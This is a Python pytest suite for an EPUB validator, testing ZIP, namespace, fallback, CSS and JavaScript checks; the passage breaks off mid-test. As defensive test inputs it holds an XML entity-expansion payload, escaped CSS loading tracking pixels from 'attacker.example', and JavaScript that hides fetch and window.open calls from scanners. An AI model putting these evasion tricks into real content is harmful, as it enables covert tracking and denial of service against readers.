import zipfile
from collections.abc import Mapping
from pathlib import Path

import any2book_processors.epub as epub_module
import pytest
from any2book_processors.epub import internal_validate

_CONTAINER = """<?xml version="1.0"?>
<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
"""
_XHTML = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head><body/></html>
"""


def _write_epub(
    path: Path,
    package: str,
    resources: Mapping[str, str | bytes],
    container: str = _CONTAINER,
) -> None:
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("mimetype", b"application/epub+zip", compress_type=zipfile.ZIP_STORED)
        archive.writestr("META-INF/container.xml", container)
        archive.writestr("OEBPS/content.opf", package)
        for name, value in resources.items():
            archive.writestr(name, value)


def test_fallback_validation_reuses_resolved_chains() -> None:
    item_count = 10_000
    items: dict[str, tuple[str | None, str, set[str], str | None]] = {
        str(index): (
            None,
            "application/octet-stream",
            set(),
            str(index + 1) if index + 1 < item_count else None,
        )
        for index in range(item_count)
    }

    epub_module._validate_fallback_chains(items)


def test_spine_fallback_traversal_has_a_shared_budget(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(epub_module, "_MAX_SPINE_FALLBACK_STEPS", 100)
    items: dict[str, tuple[str | None, str, set[str], str | None]] = {
        str(index): (
            None,
            "application/octet-stream",
            set(),
            str(index + 1) if index < 199 else None,
        )
        for index in range(200)
    }

    with pytest.raises(RuntimeError, match="fallback traversal budget exceeded"):
        epub_module._spine_chain_ids(items, "0", {}, [0])


def test_spine_fallback_traversal_reuses_cached_chains() -> None:
    items: dict[str, tuple[str | None, str, set[str], str | None]] = {
        "first": (None, "application/octet-stream", set(), "last"),
        "last": ("chapter.xhtml", "application/xhtml+xml", set(), None),
    }
    cache: dict[str, tuple[str, ...]] = {}
    budget = [0]

    expected = epub_module._spine_chain_ids(items, "first", cache, budget)
    charged_steps = budget[0]

    assert epub_module._spine_chain_ids(items, "first", cache, budget) == expected
    assert budget[0] == charged_steps


def test_css_image_set_scanning_handles_deep_nesting_in_one_pass() -> None:
    depth = 2_000
    css = "image-set(" * depth + '"cover.png"' + ")" * depth

    assert epub_module._css_references(css) == {"cover.png"}


def test_css_scanning_rejects_excessive_function_nesting(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(epub_module, "_MAX_CSS_NESTING", 16)

    with pytest.raises(RuntimeError, match="CSS nesting budget exceeded"):
        epub_module._css_references("(" * 17)


@pytest.mark.parametrize(
    "css",
    [
        'image-set( "https://attacker.example/first.png" 1x)',
        'image-set("cover.png" 1x, /* candidate */  "https://attacker.example/second.png" 2x)',
    ],
)
def test_css_image_set_scanning_preserves_candidates_across_whitespace(css: str) -> None:
    assert any(
        reference.startswith("https://attacker.example/")
        for reference in epub_module._css_references(css)
    )


def test_javascript_open_alias_chains_are_resolved_in_linear_time() -> None:
    alias_count = 5_000
    declarations = ["const alias0 = window.open;"]
    declarations.extend(
        f"const alias{index} = alias{index - 1};" for index in range(1, alias_count)
    )
    declarations.append(f"alias{alias_count - 1}('data:text/html,unsafe');")

    with pytest.raises(RuntimeError, match="data URLs cannot open browsing contexts"):
        epub_module._script_remote_references("".join(declarations), [0, 0])


def test_javascript_scope_walks_share_the_inspection_budget(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(epub_module, "_MAX_JAVASCRIPT_NODES", 10_000)
    depth = 200
    script = "{fetch('https://example.com/value');" * depth + "}" * depth

    with pytest.raises(RuntimeError, match="JavaScript token budget exceeded"):
        epub_module._script_remote_references(script, [0, 0])


def test_internal_validate_accepts_complete_epub_fixture() -> None:
    fixture = Path(__file__).parents[2] / "fixtures" / "epub" / "sample.epub"
    internal_validate(fixture)


def test_xml_validation_rejects_vulnerable_expat(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(epub_module, "_EXPAT_VERSION", (2, 5, 0))

    with pytest.raises(RuntimeError, match="requires Expat 2.6.0 or newer"):
        epub_module._bounded_xml_root([b"<root/>"], "test XML")


def test_xml_validation_rejects_internal_entity_expansion() -> None:
    payload = b"""<!DOCTYPE root [
<!ENTITY a "1234567890">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]><root>&c;</root>"""

    with pytest.raises(RuntimeError, match="unsafe DTD or entity"):
        epub_module._bounded_xml_root([payload], "test XML")


@pytest.mark.parametrize(
    ("component", "message"),
    [
        ("container", "malformed META-INF/container.xml"),
        ("package", "expected an EPUB2 or EPUB3 OPF package"),
        ("navigation", "malformed XHTML navigation document"),
        ("content", "malformed XHTML content"),
    ],
)
def test_internal_validate_rejects_foreign_epub_namespaces(
    tmp_path: Path, component: str, message: str
) -> None:
    epub = tmp_path / f"foreign-{component}.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    container = _CONTAINER
    chapter = _XHTML
    invalid_namespace = "https://invalid.example/namespace"
    if component == "container":
        container = container.replace(
            "urn:oasis:names:tc:opendocument:xmlns:container", invalid_namespace
        )
    elif component == "package":
        package = package.replace("http://www.idpf.org/2007/opf", invalid_namespace)
    elif component == "navigation":
        navigation = navigation.replace("http://www.w3.org/1999/xhtml", invalid_namespace)
    else:
        chapter = chapter.replace("http://www.w3.org/1999/xhtml", invalid_namespace)
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
        container,
    )

    with pytest.raises(RuntimeError, match=message):
        internal_validate(epub)


def test_internal_validate_rejects_an_empty_container(tmp_path: Path) -> None:
    malformed = tmp_path / "malformed.epub"
    with zipfile.ZipFile(malformed, "w") as archive:
        archive.writestr("mimetype", b"application/epub+zip", compress_type=zipfile.ZIP_STORED)
        archive.writestr("META-INF/container.xml", b"")

    with pytest.raises(RuntimeError, match="malformed META-INF/container.xml"):
        internal_validate(malformed)


def test_internal_validate_rejects_oversized_mimetype_before_reading_payload(
    tmp_path: Path,
) -> None:
    malformed = tmp_path / "oversized-mimetype.epub"
    with zipfile.ZipFile(malformed, "w") as archive:
        archive.writestr("mimetype", b"x" * 1_000_000, compress_type=zipfile.ZIP_STORED)
        archive.writestr("META-INF/container.xml", _CONTAINER)

    with pytest.raises(RuntimeError, match="Invalid EPUB mimetype"):
        internal_validate(malformed)


@pytest.mark.parametrize(
    ("first_name", "second_name"),
    [
        ("EPUB/assets/Cover.png", "EPUB/assets/cover.png"),
        ("EPUB/assets/caf\u00e9.txt", "EPUB/assets/cafe\u0301.txt"),
    ],
)
def test_internal_validate_rejects_canonically_colliding_zip_entries(
    tmp_path: Path, first_name: str, second_name: str
) -> None:
    fixture = Path(__file__).parents[2] / "fixtures" / "epub" / "sample.epub"
    epub = tmp_path / "colliding-names.epub"
    epub.write_bytes(fixture.read_bytes())
    with zipfile.ZipFile(epub, "a") as archive:
        archive.writestr(first_name, b"first")
        archive.writestr(second_name, b"second")

    with pytest.raises(RuntimeError, match="canonically colliding ZIP entries"):
        internal_validate(epub)


def test_internal_validate_rejects_unsupported_zip_compression(tmp_path: Path) -> None:
    fixture = Path(__file__).parents[2] / "fixtures" / "epub" / "sample.epub"
    epub = tmp_path / "bzip2-entry.epub"
    epub.write_bytes(fixture.read_bytes())
    with zipfile.ZipFile(epub, "a") as archive:
        archive.writestr("EPUB/unused.bin", b"unused", compress_type=zipfile.ZIP_BZIP2)

    with pytest.raises(RuntimeError, match="unsupported ZIP compression method"):
        internal_validate(epub)


def test_internal_validate_accepts_epub2_passthrough(tmp_path: Path) -> None:
    epub = tmp_path / "epub2.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
  <metadata/>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine toc="ncx"><itemref idref="chapter"/></spine>
</package>
"""
    ncx = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>
  <navPoint id="chapter">
    <navLabel><text>Book</text></navLabel><content src="chapter.xhtml"/>
  </navPoint>
</navMap></ncx>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/toc.ncx": ncx, "OEBPS/chapter.xhtml": _XHTML},
    )

    internal_validate(epub)


def test_internal_validate_accepts_deprecated_oebps_epub2_content(tmp_path: Path) -> None:
    epub = tmp_path / "epub2-oebps.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
  <metadata/>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="chapter" href="chapter.xhtml" media-type="text/x-oeb1-document"/>
  </manifest>
  <spine toc="ncx"><itemref idref="chapter"/></spine>
</package>
"""
    ncx = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>
  <navPoint id="chapter">
    <navLabel><text>Book</text></navLabel><content src="chapter.xhtml"/>
  </navPoint>
</navMap></ncx>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/toc.ncx": ncx, "OEBPS/chapter.xhtml": _XHTML},
    )

    internal_validate(epub)


def test_internal_validate_accepts_multiple_epub2_navigation_labels(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "epub2-multiple-labels.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
  <metadata/>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine toc="ncx"><itemref idref="chapter"/></spine>
</package>
"""
    ncx = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>
  <navPoint id="chapter">
    <navLabel><text>Book</text></navLabel>
    <navLabel xml:lang="vi"><text>Sách</text></navLabel>
    <content src="chapter.xhtml"/>
  </navPoint>
</navMap></ncx>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/toc.ncx": ncx, "OEBPS/chapter.xhtml": _XHTML},
    )

    internal_validate(epub)


def test_internal_validate_accepts_epub2_secondary_non_package_rootfile(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "epub2-secondary-pdf.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
  <metadata/>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine toc="ncx"><itemref idref="chapter"/></spine>
</package>
"""
    ncx = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>
  <navPoint id="chapter">
    <navLabel><text>Book</text></navLabel><content src="chapter.xhtml"/>
  </navPoint>
</navMap></ncx>
"""
    container = """<?xml version="1.0"?>
<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
    <rootfile full-path="OEBPS/book.pdf" media-type="application/pdf"/>
  </rootfiles>
</container>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/toc.ncx": ncx,
            "OEBPS/chapter.xhtml": _XHTML,
            "OEBPS/book.pdf": "%PDF fixture",
        },
        container,
    )

    internal_validate(epub)


def test_internal_validate_allows_remote_non_spine_resources(tmp_path: Path) -> None:
    epub = tmp_path / "remote.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="font" href="https://example.com/book.woff2" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>@font-face { src: url('https://ex%61mple.com/book.woff2'); }</style>
</head><body/></html>
""",
        },
    )

    internal_validate(epub)


def test_internal_validate_scans_utf16_css_resources(tmp_path: Path) -> None:
    epub = tmp_path / "utf16-css.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
    <item id="style" href="style.css" media-type="text/css"
          properties="remote-resources"/>
    <item id="font" href="https://example.com/book.woff2" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <link rel="stylesheet" href="style.css"/>
</head><body/></html>
"""
    stylesheet = "@font-face { src: url('https://example.com/book.woff2'); }".encode("utf-16")
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": chapter,
            "OEBPS/style.css": stylesheet,
        },
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    "css_reference",
    [
        'url("https://example.com/My Font.woff2")',
        r"url(https://example.com/My\ Font.woff2)",
    ],
)
def test_internal_validate_parses_quoted_and_escaped_css_urls(
    tmp_path: Path, css_reference: str
) -> None:
    epub = tmp_path / "remote-css-space.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="font" href="https://example.com/My%20Font.woff2" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>
    @font-face {{ src: {css_reference}; }}
    p::before {{ content: "url(https://invalid.example)"; }}
  </style>
</head><body/></html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    "css_rule",
    [
        r"body { background: u\72l(https://attacker.example/pixel); }",
        'body { background: image-set("https://attacker.example/pixel" 1x); }',
        'body { background: -webkit-image-set("https://attacker.example/pixel" 1x); }',
    ],
)
def test_internal_validate_detects_remote_css_functions(tmp_path: Path, css_rule: str) -> None:
    epub = tmp_path / "escaped-css-function.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>{css_rule}</style>
</head><body/></html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match="remote resource is missing from the manifest"):
        internal_validate(epub)


def test_internal_validate_normalizes_unicode_remote_manifest_urls(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "unicode-remote-url.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="font" href="https://example.com/phông.woff2" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>@font-face { src: url("https://example.com/phông.woff2"); }</style>
</head><body/></html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    ("manifest_url", "css_url"),
    [
        (
            "https://EXAMPLE.com:443/font.woff2",
            "https://example.com/font.woff2",
        ),
        (
            "http://example.com:80/font.woff2",
            "http://EXAMPLE.com/font.woff2",
        ),
        (
            "https://example.com/fonts/../font.woff2",
            "https://example.com/font.woff2",
        ),
        (
            "https://example.com/%66ont.woff2",
            "https://example.com/font.woff2",
        ),
        (
            "https://[0:0:0:0:0:0:0:1]/font.woff2",
            "https://[::1]/font.woff2",
        ),
    ],
)
def test_internal_validate_canonicalizes_equivalent_remote_urls(
    tmp_path: Path, manifest_url: str, css_url: str
) -> None:
    epub = tmp_path / "canonical-remote-url.epub"
    package = f"""<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="font" href="{manifest_url}" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>@font-face {{ src: url("{css_url}"); }}</style>
</head><body/></html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


def test_internal_validate_resolves_remote_resources_against_html_base(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "remote-base.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="audio" href="https://cdn.example/book/track.mp3" media-type="audio/mpeg"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head><title>Book</title><base href="https://cdn.example/book/"/></head>
  <body><audio src="track.mp3"/></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


def test_internal_validate_resolves_navigation_against_html_base(tmp_path: Path) -> None:
    epub = tmp_path / "navigation-base.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="sections/chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title><base href="sections/"/></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/sections/chapter.xhtml": _XHTML},
    )

    internal_validate(epub)


def test_internal_validate_resolves_navigation_against_ancestor_xml_base(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "navigation-xml-base.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="sections/chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc" xml:base="sections/">
    <ol><li><a href="chapter.xhtml">Book</a></li></ol>
  </nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/sections/chapter.xhtml": _XHTML},
    )

    internal_validate(epub)


def test_internal_validate_detects_remote_srcset_resources(tmp_path: Path) -> None:
    epub = tmp_path / "remote-srcset.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><img srcset="https://cdn.example/one.png 1x, https://cdn.example/two.png 2x"/></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match="remote resource is missing from the manifest"):
        internal_validate(epub)


def test_internal_validate_accepts_epub31_package_version(tmp_path: Path) -> None:
    epub = tmp_path / "epub31.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.1">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": _XHTML},
    )

    internal_validate(epub)


def test_internal_validate_allows_separately_declared_script_data(tmp_path: Path) -> None:
    epub = tmp_path / "script-data.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="scripted"/>
    <item id="script" href="script.js" media-type="text/javascript"
          properties="remote-resources"/>
    <item id="example" href="example.js" media-type="text/javascript"/>
    <item id="style" href="style.css" media-type="text/css"/>
    <item id="data" href="https://example.com/data.json" media-type="application/json"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><link rel="stylesheet" href="style.css"/>
    <script src="script.js"></script><script src="example.js"></script>
  </body>
</html>
""",
            "OEBPS/script.js": "fetch('https://example.com/data.json')",
            "OEBPS/example.js": (
                "\\uZZZZ\n"
                "const example = \"fetch('https://example.com/data.json')\";\n"
                "const entity = \"&quot;; fetch('https://invalid.example/js') //\";\n"
                r"if (ok) /fetch('https:\/\/invalid.example')/.test(text);"
                "\nconst catalog = { fetch() {}, open() {} };"
                "\ncatalog.fetch('https://invalid.example/local-id');"
                "\ncatalog.open('GET', 'https://invalid.example/local-id');"
                "\nfunction fetch(value) { return value; }"
                "\nfunction open(value) { return value; }"
                "\nfetch('https://invalid.example/shadowed');"
                "\nopen('data:text/plain,shadowed');"
                "\nconst run = fetch => fetch('https://invalid.example/arrow-parameter');"
                "\nrun(console.log);"
                "\nlet launch = window.open; launch = () => {};"
                "\nlaunch('data:text/plain,reassigned');"
                "\nlet requestAlias = fetch; requestAlias = () => {};"
                "\nrequestAlias('https://invalid.example/reassigned-fetch');"
                "\nlet request = new XMLHttpRequest(); request = { open() {} };"
                "\nrequest.open('GET', 'https://invalid.example/reassigned-xhr');"
                "\nlet context = window; context = { open() {} };"
                "\ncontext.open('data:text/plain,reassigned-context');"
            ),
            "OEBPS/style.css": (
                "@namespace html url(http://www.w3.org/1999/xhtml);\n"
                'p::before { content: "&quot;; '
                'url(https://invalid.example/css)"; }'
            ),
        },
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    "scripted_markup",
    [
        "<script>fetch('https://example.com/data.json')</script>",
        '<script type="importmap">{"imports":{"data":"https://example.com/data.json"}}</script>',
        '<script type="speculationrules">'
        '{"prefetch":[{"source":"list","urls":["https://example.com/data.json"]}]}'
        "</script>",
        "<p onclick=\"fetch('https://example.com/data.json')\">Open</p>",
    ],
)
def test_internal_validate_requires_scripted_on_the_actual_content_document(
    tmp_path: Path, scripted_markup: str
) -> None:
    epub = tmp_path / "unmarked-scripted-referrer.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="unrelated" href="unrelated.xhtml" media-type="application/xhtml+xml"
          properties="scripted"/>
    <item id="data" href="https://example.com/data.json" media-type="application/json"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body>{scripted_markup}</body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
